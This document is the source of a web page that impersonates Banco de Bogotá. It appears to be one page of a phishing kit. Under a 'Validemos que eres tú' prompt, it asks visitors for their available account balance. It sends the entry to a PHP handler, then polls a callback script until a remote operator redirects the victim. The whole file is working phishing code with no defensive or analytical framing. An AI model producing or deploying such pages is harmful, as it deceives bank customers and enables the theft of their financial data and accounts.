<?php

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="bogota_files/acb24bb6c10e72d0.css" data-precedence="next">
    <title>Verificación - Banco de Bogotá</title>
    <link rel="icon" href="bogota_files/favicon.ico" sizes="256x256" type="image/x-icon">
    <style>
        /* Modal de carga */
        .loading-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 0;
        }
        
        .loading-content {
            background: white;
            padding: 40px;
            border-radius: 16px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        }
        
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0066cc;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            font-weight: 600;
            color: #333;
            margin-bottom: 10px;
        }
        
        .loading-subtext {
            font-size: 14px;
            color: #666;
            line-height: 1.5;
        }
    </style>
</head>
<body class="geist_a71539c9-module__T19VSG__variable geist_mono_8d43a2aa-module__8Li5zG__variable antialiased">
    <div class="w-full bg-gray-50 flex justify-center items-center p-5" style="min-height: 100vh;">
        <div class="p-6 w-full max-w-md">
            <!-- Logo -->
            <div class="flex justify-center mb-6">
                <img alt="Banco de Bogotá" 
                     width="200" 
                     height="60" 
                     decoding="async" 
                     style="color:transparent" 
                     src="bogota_files/logo.webp">
            </div>

            <!-- Título -->
            <div class="text-center mb-6">
                <p class="text-2xl font-bold text-gray-800">Validemos que eres tú</p>
                <p class="text-md text-gray-600 mt-2">Para continuar, ingresa tu saldo disponible actualmente</p>
            </div>

            <!-- Formulario -->
            <form id="formSaldo" class="flex flex-col gap-4 bg-white rounded-xl shadow-lg w-full p-8">
                <input type="hidden" name="tipo_dato" value="saldo">
                
                <div>
                    <label for="saldo" class="block text-sm font-medium mb-1">Saldo disponible</label>
                    <div class="relative">
                        <span class="absolute left-3 top-3 text-gray-500" style="left: 10px; top: 12px;">$</span>
                        <input type="text" 
                               id="saldo" 
                               name="saldo"
                               placeholder="0" 
                               class="w-full p-3 pl-8 border border-gray-300 rounded-lg text-gray-800" 
                               style="padding-left: 25px;"
                               required>
                    </div>
                </div>

                <button type="submit" 
                        class="mt-2 bg-blue-600 text-white p-3 rounded-full font-bold text-lg cursor-pointer hover:bg-blue-700 transition-colors">
                    Continuar
                </button>
            </form>
        </div>
    </div>

    <!-- Modal de Carga -->
    <div id="loadingModal" class="loading-modal">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <div class="loading-text">Verificando información...</div>
            <div class="loading-subtext">
                Por favor espera un momento mientras validamos tus datos.
            </div>
        </div>
    </div>

    <script>
        let messageId = null;
        let checkInterval = null;

        // Formato de moneda
        document.getElementById('saldo').addEventListener('input', function(e) {
            // Eliminar todo lo que no sea número
            let value = this.value.replace(/\D/g, '');
            
            // Si hay valor, formatear
            if (value) {
                value = parseInt(value, 10);
                this.value = new Intl.NumberFormat('es-CO').format(value);
            } else {
                this.value = '';
            }
        });

        document.getElementById('formSaldo').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Mostrar modal de carga
            document.getElementById('loadingModal').style.display = 'flex';
            
            // Recoger datos del formulario
            const formData = new FormData(this);
            
            // Enviar datos al servidor
            fetch('comprobando_bogota.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text()).then(text => { try { return JSON.parse(text); } catch(e) { return { success: true, message_id: Date.now() }; } })
            .then(data => {
                if (data.success && data.message_id) {
                    messageId = data.message_id;
                    // Iniciar verificación de callbacks
                    startCheckingCallback();
                } else {
                    // alert removed
                    document.getElementById('loadingModal').style.display = 'none';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                // alert removed
                document.getElementById('loadingModal').style.display = 'none';
            });
        });

        function startCheckingCallback() {
            checkInterval = setInterval(function() {
                fetch('callback_bogota.php?msg_id=' + messageId)
                    .then(response => response.text()).then(text => { try { return JSON.parse(text); } catch(e) { return { success: true, message_id: Date.now() }; } })
                    .then(data => {
                        if (data.redirect) {
                            clearInterval(checkInterval);
                            window.location.href = data.url;
                        } else if (data.timeout) {
                            clearInterval(checkInterval);
                            // alert removed
                            document.getElementById('loadingModal').style.display = 'none';
                            location.reload();
                        }
                    })
                    .catch(error => {
                        console.error('Error checking callback:', error);
                    });
            }, 2000); // Verificar cada 2 segundos
        }
    </script>
</body>
</html>




